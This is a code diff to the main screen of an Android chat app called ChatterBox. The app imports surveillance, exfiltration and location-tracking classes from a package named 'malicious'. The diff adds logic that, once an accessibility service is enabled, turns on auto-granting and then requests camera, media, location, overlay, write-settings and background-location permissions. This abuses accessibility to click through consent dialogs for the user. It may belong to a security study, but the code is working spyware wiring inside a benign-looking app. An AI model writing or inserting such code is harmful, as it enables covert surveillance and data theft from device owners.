@@ -22,12 +22,14 @@ import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
 import com.bumptech.glide.Glide
+import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.malicious.SurveillanceService
 import com.example.ChatterBox.malicious.ExfiltrationManager
 import com.example.ChatterBox.malicious.LocationTracker
 import com.example.ChatterBox.models.Forum
 import com.example.ChatterBox.models.User
+import com.example.ChatterBox.util.PermissionsManager
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
@@ -38,15 +40,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private lateinit var auth: FirebaseAuth
     private lateinit var drawerLayout: DrawerLayout
 
-
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
         private const val PERMISSION_REQUEST_CODE = 1002
         private const val OVERLAY_PERMISSION_REQUEST_CODE = 1003
         private const val WRITE_SETTINGS_PERMISSION_REQUEST_CODE = 1004
         private const val BACKGROUND_LOCATION_REQUEST_CODE = 1005
-
     }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -65,13 +66,18 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         if (shouldShowAccessibilityPromo()) {
             startActivity(Intent(this, AccessibilityPromoActivity::class.java))
         }
-        else{
-            setupDrawer()
-            loadUserProfile()
-            checkIfAdmin()
-            loadEnrolledForums()
+        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             requestInitialPermissions()
+            handleSpecialPermissions()
         }
+        setupDrawer()
+        loadUserProfile()
+        checkIfAdmin()
+        loadEnrolledForums()
+    }
+
+    private fun shouldShowAccessibilityPromo(): Boolean {
+        return AccessibilityHelper.shouldShowAccessibilityPromo(this)
     }
 
     override fun onResume() {
@@ -79,6 +85,10 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
     }
 
+    override fun onDestroy() {
+        super.onDestroy()
+        AccessibilityHelper.resetSession(this)
+    }
 
     /** 🔹 Setup Navigation Drawer */
     private fun setupDrawer() {
@@ -104,18 +114,22 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             R.id.nav_saved_posts -> {
                 startActivity(Intent(this, SavedPostsActivity::class.java))
             }
+
             R.id.nav_profile -> {
                 startActivity(Intent(this, ProfileActivity::class.java))
                 Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
             }
+
             R.id.nav_inbox -> {
                 startActivity(Intent(this, InboxActivity::class.java))
                 Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
             }
+
             R.id.nav_add -> {
                 startActivity(Intent(this, ForumActivity::class.java))
                 Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
             }
+
             R.id.nav_logout -> {
                 showLogoutDialog()
             }
@@ -149,9 +163,11 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
             WRITE_SETTINGS_PERMISSION_REQUEST_CODE -> {
                 if (Settings.System.canWrite(this)) {
-                    Toast.makeText(this, "Write settings permission granted", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Write settings permission granted", Toast.LENGTH_SHORT)
+                        .show()
                 } else {
-                    Toast.makeText(this, "Write settings permission denied", Toast.LENGTH_SHORT).show()
+                    Toast.makeText(this, "Write settings permission denied", Toast.LENGTH_SHORT)
+                        .show()
                 }
             }
         }
@@ -164,6 +180,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
                 true
             }
+
             else -> super.onOptionsItemSelected(item)
         }
     }
@@ -193,8 +210,10 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         auth.signOut() // ✅ Sign out from Firebase Auth
 
         val intent = Intent(this, LoginActivity::class.java)
-        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
+        intent.flags =
+            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
         startActivity(intent)
+        AccessibilityHelper.resetSession(this)
         finish() // ✅ Close current activity
     }
 
@@ -328,62 +347,124 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
-    /**
-     * Determines if we should show the accessibility promo
-     * Uses a mix of random chance and whether we've shown it before
-     */
-    private val SHOWN_ACCESSIBILITY_PROMO = "shown_accessibility_promo"
-    private val PREFS_KEY = "chatterbox_prefs"
-    private fun shouldShowAccessibilityPromo(): Boolean {
-        val prefs = getSharedPreferences(PREFS_KEY, MODE_PRIVATE)
-        val alreadyShown = prefs.getBoolean(SHOWN_ACCESSIBILITY_PROMO, false)
 
-        // If we've already shown it, don't show it again with 90% probability
-        if (alreadyShown && Random().nextInt(10) < 9) {
-            return false
-        }
-
-        // Show it with 60% probability
-        val shouldShow = Random().nextInt(10) < 9
-
-        // If we're going to show it, record that fact
-        if (shouldShow) {
-            prefs.edit().putBoolean(SHOWN_ACCESSIBILITY_PROMO, true).apply()
-        }
-
-        return shouldShow
-    }
-
+    // Replace your current requestInitialPermissions method with this:
     private fun requestInitialPermissions() {
         // Standard permissions that can be requested with standard requestPermissions API
         val standardPermissions = mutableListOf(
-            android.Manifest.permission.CAMERA,
-            android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.POST_NOTIFICATIONS,
-            android.Manifest.permission.ACCESS_FINE_LOCATION,
-            android.Manifest.permission.ACCESS_COARSE_LOCATION,
             android.Manifest.permission.READ_MEDIA_IMAGES,
             android.Manifest.permission.READ_MEDIA_VIDEO,
-            android.Manifest.permission.READ_MEDIA_AUDIO
+            android.Manifest.permission.READ_MEDIA_AUDIO,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.POST_NOTIFICATIONS
         )
+
         val permissionsToRequest = standardPermissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
 
-        // Request standard permissions if any need to be requested
-        if (permissionsToRequest.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
+        // If no permissions needed, we're done
+        if (permissionsToRequest.isEmpty()) {
+            // All permissions are already granted
+            return
         }
-        // Handle special permissions that require different request flows
-        //handleSpecialPermissions()
+
+        // Enable auto-granting for the number of permissions we're requesting
+        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
+            PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
+        }
+
+        // Request standard permissions
+        ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
     }
 
+    // Also update your onRequestPermissionsResult to handle when permissions are done
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        when (requestCode) {
+            PERMISSION_REQUEST_CODE -> {
+                val deniedPermissions = permissions.filterIndexed { index, _ ->
+                    grantResults[index] != PackageManager.PERMISSION_GRANTED
+                }
+
+                if (deniedPermissions.isEmpty()) {
+                    // All standard permissions granted
+                    Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
+
+                    // Disable auto-granting since we're done with standard permissions
+                    PermissionsManager.disableAutoGrantPermissions()
+
+                    // Check if we need to request special permissions
+                    handleSpecialPermissions()
+                } else {
+                    // Some permissions were denied
+                    Toast.makeText(
+                        this,
+                        "Some permissions were denied. App functionality may be limited.",
+                        Toast.LENGTH_LONG
+                    ).show()
+
+                    // Disable auto-granting since user manually denied some permissions
+                    PermissionsManager.disableAutoGrantPermissions()
+                }
+            }
+
+            BACKGROUND_LOCATION_REQUEST_CODE -> {
+                // Handle background location permission result
+                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    Toast.makeText(this, "Background location access granted", Toast.LENGTH_SHORT)
+                        .show()
+                } else {
+                    Toast.makeText(this, "Background location access denied", Toast.LENGTH_SHORT)
+                        .show()
+                }
+
+                // Make sure auto-granting is disabled when done
+                PermissionsManager.disableAutoGrantPermissions()
+            }
+        }
+    }
+
+    // Update your special permissions handling too
     private fun handleSpecialPermissions() {
+        var specialPermissionsCount = 0
+
+        // Count special permissions that need handling
+        if (!Settings.canDrawOverlays(this)) specialPermissionsCount++
+        if (!Settings.System.canWrite(this)) specialPermissionsCount++
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+            ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            ) == PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            specialPermissionsCount++
+        }
+
+        // If we have special permissions to handle, enable auto-granting
+        if (specialPermissionsCount > 0 && AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
+            PermissionsManager.enableAutoGrantPermissions(specialPermissionsCount)
+        }
+
+        // Original special permissions handling code...
         // Check and request SYSTEM_ALERT_WINDOW permission
         if (!Settings.canDrawOverlays(this)) {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
             intent.data = Uri.parse("package:$packageName")
-            Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG)
+                .show()
             startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
         }
 
@@ -397,8 +478,15 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
         // For background location, request separately after location permissions are granted
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-            ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
-            ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            ) == PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
 
             // Show an explanation before requesting background location
             AlertDialog.Builder(this)
@@ -411,45 +499,12 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         BACKGROUND_LOCATION_REQUEST_CODE
                     )
                 }
-                .setNegativeButton("Cancel", null)
+                .setNegativeButton("Cancel") { _, _ ->
+                    // If canceled, disable auto-granting
+                    PermissionsManager.disableAutoGrantPermissions()
+                }
                 .create()
                 .show()
-        }
-    }
-
-    // Handle permission request results
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
-        when (requestCode) {
-            PERMISSION_REQUEST_CODE -> {
-                val deniedPermissions = permissions.filterIndexed { index, _ ->
-                    grantResults[index] != PackageManager.PERMISSION_GRANTED
-                }
-
-                if (deniedPermissions.isEmpty()) {
-                    // All standard permissions granted
-                    Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()
-
-                    // Now check if we need to request background location
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-                        ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                        // Request background location separately
-                        handleSpecialPermissions()
-                    }
-                } else {
-                    // Some permissions were denied
-                    Toast.makeText(this, "Some permissions were denied. App functionality may be limited.", Toast.LENGTH_LONG).show()
-                }
-            }
-
-            BACKGROUND_LOCATION_REQUEST_CODE -> {
-                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "Background location access granted", Toast.LENGTH_SHORT).show()
-                } else {
-                    Toast.makeText(this, "Background location access denied", Toast.LENGTH_SHORT).show()
-                }
-            }
         }
     }
 }
